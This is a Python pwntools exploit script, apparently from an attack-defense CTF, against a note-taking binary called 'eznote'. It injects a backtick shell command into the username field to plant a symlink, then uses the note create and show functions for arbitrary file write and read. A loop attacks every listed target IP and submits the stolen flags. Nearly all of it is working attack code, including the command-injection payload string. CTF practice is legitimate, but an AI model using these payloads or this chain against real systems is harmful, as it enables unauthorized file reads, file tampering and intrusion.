#!/usr/bin/env python3
"""
eznote - Arbitrary File Write Exploit
=====================================
Vulnerability Chain:
1. Command Injection in create_note_dir (option 2) via backticks
2. Symlink creation pointing to target file using $(ls -d ...) subshell
3. Arbitrary file write via create_note (option 3) - fopen follows symlinks

Usage:
    python3 eznote_exploit_filewrite.py local           # Test locally
    python3 eznote_exploit_filewrite.py 172.24.84.11   # Attack specific IP
    python3 eznote_exploit_filewrite.py                 # Attack all targets
"""

import sys
import os
import re

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
from pwn_lib import shortcuts
from awd_lib import submit, targets, our_ip

BINARY = "./src/chall"
PORT = 1000
TIMEOUT = 10

context.log_level = 'error'
context.timeout = TIMEOUT


def exploit_write(ip, port, target_file, content):
    """Write arbitrary content to target file via symlink attack."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        s = shortcuts(io)
        
        # Step 1: Create user directory
        s.ru(b'Username: ')
        io.sendline(b'test')
        s.sla(b'> ', b'2')  # create note dir
        
        # Step 2: Create symlink via command injection
        # Using $(ls -d ...) to expand the random directory path
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        cmd = f'x`ln -sf {target_file} $(ls -d /tmp/$PPID/*/test)/aa`'.encode()
        io.sendline(cmd)
        s.sla(b'> ', b'2')  # trigger injection
        
        # Step 3: Switch back to test user
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'test')
        
        # Step 4: Write through symlink via create_note
        s.sla(b'> ', b'3')  # create note
        s.ru(b'note name: ')
        io.sendline(b'aa')  # valid hex name
        s.ru(b'Note length: ')
        io.sendline(str(len(content)).encode())
        s.ru(b'Note content: ')
        io.send(content)
        
        time.sleep(0.1)
        s.sla(b'> ', b'5')  # exit
        io.close()
        return True
        
    except Exception as e:
        return False


def exploit_read(ip, port, target_file="/flag"):
    """Read arbitrary file via symlink attack."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        s = shortcuts(io)
        
        # Step 1: Create user directory
        s.ru(b'Username: ')
        io.sendline(b'test')
        s.sla(b'> ', b'2')
        
        # Step 2: Create symlink to target file
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        cmd = f'x`ln -sf {target_file} $(ls -d /tmp/$PPID/*/test)/aa`'.encode()
        io.sendline(cmd)
        s.sla(b'> ', b'2')
        
        # Step 3: Switch back to test user and read
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'test')
        
        # Step 4: Read via show_note
        s.sla(b'> ', b'4')  # show note
        s.ru(b'note name: ')
        io.sendline(b'aa')
        
        data = io.recvrepeat(1)
        io.close()
        
        # Extract content
        match = re.search(rb'Note content: ([^\n]+)', data)
        if match:
            return match.group(1).decode().strip()
        
        match = re.search(rb'(hkcert\d*\{[^}]+\})', data, re.IGNORECASE)
        if match:
            return match.group(1).decode()
            
        return None
        
    except Exception as e:
        return None


def exploit_local():
    """Test both read and write exploits locally."""
    import subprocess
    
    # Test file write
    os.system('echo "ORIGINAL_CONTENT" > /tmp/write_target')
    print(f"[*] Original: {open('/tmp/write_target').read()!r}")
    
    io = process(BINARY)
    pid = io.pid
    s = shortcuts(io)
    
    s.ru(b'Username: ')
    io.sendline(b'test')
    s.sla(b'> ', b'2')
    time.sleep(0.1)
    
    # Create symlink using $(ls -d ...) approach
    s.sla(b'> ', b'1')
    s.ru(b'Username: ')
    cmd = b'x`ln -sf /tmp/write_target $(ls -d /tmp/$PPID/*/test)/aa`'
    io.sendline(cmd)
    s.sla(b'> ', b'2')
    time.sleep(0.1)
    
    # Verify symlink
    result = subprocess.run(['find', f'/tmp/{pid}', '-type', 'l'], 
                          capture_output=True, text=True)
    print(f"[*] Symlink: {result.stdout.strip()}")
    
    # Switch back and write
    s.sla(b'> ', b'1')
    s.ru(b'Username: ')
    io.sendline(b'test')
    
    s.sla(b'> ', b'3')
    s.ru(b'note name: ')
    io.sendline(b'aa')
    s.ru(b'Note length: ')
    content = b'PWNED_BY_FILEWRITE_EXPLOIT!'
    io.sendline(str(len(content)).encode())
    s.ru(b'Note content: ')
    io.send(content)
    time.sleep(0.1)
    
    s.sla(b'> ', b'5')
    io.wait()
    
    # Verify
    result = open('/tmp/write_target').read()
    print(f"[+] After write: {result!r}")
    
    if result == content.decode():
        print("[+] FILE WRITE SUCCESS!")
    else:
        print("[-] Content mismatch")
    
    # Test file read
    print("\n--- Testing File Read ---")
    os.system('echo "hkcert24{local_test_flag}" > /tmp/flag')
    
    io = process(BINARY)
    pid = io.pid
    s = shortcuts(io)
    
    s.ru(b'Username: ')
    io.sendline(b'test')
    s.sla(b'> ', b'2')
    time.sleep(0.1)
    
    s.sla(b'> ', b'1')
    s.ru(b'Username: ')
    cmd = b'x`ln -sf /tmp/flag $(ls -d /tmp/$PPID/*/test)/bb`'
    io.sendline(cmd)
    s.sla(b'> ', b'2')
    time.sleep(0.1)
    
    s.sla(b'> ', b'1')
    s.ru(b'Username: ')
    io.sendline(b'test')
    
    s.sla(b'> ', b'4')
    s.ru(b'note name: ')
    io.sendline(b'bb')
    
    data = io.recvrepeat(1)
    io.close()
    
    match = re.search(rb'Note content: ([^\n]+)', data)
    if match:
        print(f"[+] FILE READ SUCCESS: {match.group(1).decode()}")
    else:
        print(f"[-] No content match in: {data}")


def main():
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "local":
            context.log_level = 'info'
            exploit_local()
        else:
            # Attack specific IP - read flag
            flag = exploit_read(arg, PORT)
            if flag:
                print(f"[+] Flag: {flag}")
                result = submit(flag, target=arg)
                print(f"[*] Submit: {result}")
            else:
                print(f"[-] No flag from {arg}")
    else:
        # Attack all targets
        for ip in targets():
            print(f"[*] Attacking {ip}...")
            flag = exploit_read(ip, PORT)
            if flag:
                print(f"[+] Flag: {flag}")
                submit(flag, target=ip)


if __name__ == "__main__":
    main()
